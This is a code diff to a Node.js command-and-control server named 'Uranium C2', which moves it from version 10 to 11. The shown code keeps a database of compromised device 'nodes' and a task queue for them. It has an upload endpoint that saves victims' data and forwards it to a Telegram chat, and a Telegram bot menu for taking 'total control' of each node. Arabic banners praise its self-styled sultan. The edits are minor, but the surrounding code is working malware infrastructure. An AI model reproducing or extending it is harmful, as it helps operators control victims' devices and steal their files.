@@ -1,6 +1,5 @@
 // =========================================================================
-// ⚡ مملكة ناصر دين الله الكلعي ⚡ - Uranium C2 Server v10.0 Omnipotent
-// السلطان: ناصر دين الله الكلعي 💀 | السيادة الرقمية المطلقة والفعالية الحقيقية
+// ⚡ مملكة ناصر دين الله الكلعي ⚡ - Uranium C2 Server v11.0 Omnipotent
 // =========================================================================
 require('dotenv').config();
 const express = require('express');
@@ -13,14 +12,14 @@ const token = process.env.TG_TOKEN;
 const chatId = process.env.TG_ID;
 
 if (!token || !chatId) {
-    console.error('[-] Critical Error: Telegram credentials missing in environment.');
+    console.error('[-] Critical Error: Telegram credentials missing.');
     process.exit(1);
 }
 
 const STORAGE_DIR = path.join(__dirname, 'uranium_storage');
 if (!fs.existsSync(STORAGE_DIR)) fs.mkdirSync(STORAGE_DIR, { recursive: true });
 
-const db = new sqlite3.Database('./uranium_core_v10.db');
+const db = new sqlite3.Database('./uranium_core_v11.db');
 db.serialize(() => {
     db.run(`CREATE TABLE IF NOT EXISTS nodes (id TEXT PRIMARY KEY, model TEXT, last_seen INTEGER)`);
     db.run(`CREATE TABLE IF NOT EXISTS tasks (id INTEGER PRIMARY KEY AUTOINCREMENT, node_id TEXT, action TEXT, payload TEXT, status TEXT)`);
@@ -81,7 +80,7 @@ async function sendTgDocumentSmart(filePath, caption) {
 }
 
 app.get('/', (req, res) => {
-    res.status(200).send(`<html><body style="background:#000;color:#00ff66;font-family:monospace;text-align:center;padding-top:50px;"><h1>[☢️] URANIUM C2 SERVER v10.0 ONLINE (السلطان ناصر دين الله الكلعي) [☢️]</h1></body></html>`);
+    res.status(200).send(`<html><body style="background:#000;color:#00ff66;font-family:monospace;text-align:center;padding-top:50px;"><h1>[☢️] URANIUM C2 v11.0 ONLINE (السلطان ناصر دين الله الكلعي) [☢️]</h1></body></html>`);
 });
 
 app.post('/api/v3/uranium/upload_raw', async (req, res) => {
@@ -108,6 +107,7 @@ app.post('/api/v3/uranium/upload_raw', async (req, res) => {
 
         res.status(200).json({ status: 'OK', message: 'SAVED_AND_FORWARDED' });
     } catch (e) {
+        console.error('Upload Error:', e);
         res.status(500).json({ status: 'SERVER_ERROR', message: e.message });
     }
 });
@@ -163,7 +163,7 @@ appBot.on('message', async (msg) => {
                 inlineKeyboard.push([{ text: `☢️ ${node.model} (${node.id.substring(0, 6)})`, callback_data: `menu_${node.id}` }]);
             });
 
-            await sendTg(`👑 <b>مملكة السلطان ناصر دين الله الكلعي - غرفة القيادة v10.0:</b>\nاختر العقدة للسيطرة التامة:`, {
+            await sendTg(`👑 <b>مملكة السلطان ناصر دين الله الكلعي - غرفة القيادة v11.0:</b>\nاختر العقدة للسيطرة التامة:`, {
                 reply_markup: { inline_keyboard: inlineKeyboard }
             });
         });
@@ -223,4 +223,4 @@ appBot.on('callback_query', async (query) => {
 });
 
 const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => console.log(`[+] Uranium C2 Server v10.0 Online on port ${PORT} (ناصر دين الله الكلعي)`));
+app.listen(PORT, () => console.log(`[+] Uranium C2 Server v11.0 Online on port ${PORT} (ناصر دين الله الكلعي)`));
